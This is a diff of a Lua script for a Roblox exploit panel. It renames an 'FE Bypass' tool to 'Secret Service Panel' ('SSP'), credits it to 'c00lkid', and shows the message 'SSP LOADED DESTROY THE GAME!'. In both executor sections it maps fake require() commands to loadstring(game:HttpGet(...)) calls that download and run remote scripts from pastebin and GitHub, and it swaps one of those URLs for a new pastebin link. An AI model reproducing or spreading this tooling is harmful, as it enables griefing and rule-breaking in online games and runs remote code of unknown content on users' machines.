@@ -69,7 +69,7 @@ Inject.BorderSizePixel = 4
 Inject.Position = UDim2.new(0.0244563799, 0, 0.0445344113, 0)
 Inject.Size = UDim2.new(0, 148, 0, 225)
 Inject.Font = Enum.Font.Gotham
-Inject.Text = "LOAD FE BYPASS"
+Inject.Text = "LOAD SSP"
 Inject.TextColor3 = Color3.fromRGB(30, 0, 0)
 Inject.TextSize = 40.000
 Inject.TextWrapped = true
@@ -95,7 +95,7 @@ Executor.BorderSizePixel = 4
 Executor.Position = UDim2.new(0.717809081, 0, 0.0445344113, 0)
 Executor.Size = UDim2.new(0, 111, 0, 139)
 Executor.Font = Enum.Font.Gotham
-Executor.Text = "Executor"
+Executor.Text = "Secret Service Panel"
 Executor.TextColor3 = Color3.fromRGB(30, 0, 0)
 Executor.TextSize = 25.000
 Executor.TextWrapped = true
@@ -108,7 +108,7 @@ TextLabel.BorderSizePixel = 0
 TextLabel.Position = UDim2.new(0.381778747, 0, 0.607287467, 0)
 TextLabel.Size = UDim2.new(0, 285, 0, 97)
 TextLabel.Font = Enum.Font.Gotham
-TextLabel.Text = "FE Bypass made by c00lkid"
+TextLabel.Text = "SSP made by c00lkid"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.TextSize = 30.000
 TextLabel.TextWrapped = true
@@ -582,8 +582,10 @@ local function EYBRV_fake_script() -- Inject.LocalScript
 			local message = Instance.new("Message")
 			message.Parent = workspace
 			message.Text = "FE BYPASS LOADING.."
-			wait(4)
-			message.Text = "FE BYPASS LOADED DESTROY THE GAME!"
+			wait(2)
+			message.Text = "REQUIRE LOADER LOADING..."
+			wait(2)
+			message.Text = "SSP LOADED DESTROY THE GAME!"
 			wait(2)
 			message:Destroy()
 			injected = true
@@ -621,7 +623,7 @@ local function QPQOTFN_fake_script() -- Executor.LocalScript
 		elseif bypassed == false then
 			local message = Instance.new("Message")
 			message.Parent = workspace
-			message.Text = "HAVENT LOADED FE BYPASS"
+			message.Text = "HAVENT LOADED SSP"
 			wait(1)
 			message:Destroy()
 		end
@@ -1097,7 +1099,7 @@ local function YPLY_fake_script() -- Execute.LocalScript
 		elseif script.Parent.Parent.size.CMDBox.Text == "require(9sxf7TVz)('"..game.Players.LocalPlayer.Name.."')" then
 			loadstring(game:HttpGet(('https://pastebin.com/raw/9sxf7TVz'),true))()
 		elseif script.Parent.Parent.size.CMDBox.Text == "require(7624679472)('"..game.Players.LocalPlayer.Name.."')" then
-			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/IY%20Admin'),true))()
+			loadstring(game:HttpGet("https://pastebin.com/raw/DzAW7DWA"))()
 		elseif script.Parent.Parent.size.CMDBox.Text == "require(0x31051dacc).v2FIXED('"..game.Players.LocalPlayer.Name.."')" then
 			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/k00pgui'),true))()
 		elseif script.Parent.Parent.size.CMDBox.Text == "require(4159766103).load('"..game.Players.LocalPlayer.Name.."')" then
@@ -1209,7 +1211,7 @@ local function IUOIY_fake_script() -- exe.LocalScript
 		elseif script.Parent.Parent.TextBox.Text == "require(9sxf7TVz)('"..game.Players.LocalPlayer.Name.."')" then
 			loadstring(game:HttpGet(('https://pastebin.com/raw/9sxf7TVz'),true))()
 		elseif script.Parent.Parent.TextBox.Text == "require(7624679472)('"..game.Players.LocalPlayer.Name.."')" then
-			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/IY%20Admin'),true))()
+			loadstring(game:HttpGet(('https://pastebin.com/raw/DzAW7DWA'),true))()
 		elseif script.Parent.Parent.TextBox.Text == "require(0x31051dacc).v2FIXED('"..game.Players.LocalPlayer.Name.."')" then
 			loadstring(game:HttpGet(('https://raw.githubusercontent.com/rusello25/scripts/main/k00pgui'),true))()
 		elseif script.Parent.Parent.TextBox.Text == "require(4159766103).load('"..game.Players.LocalPlayer.Name.."')" then
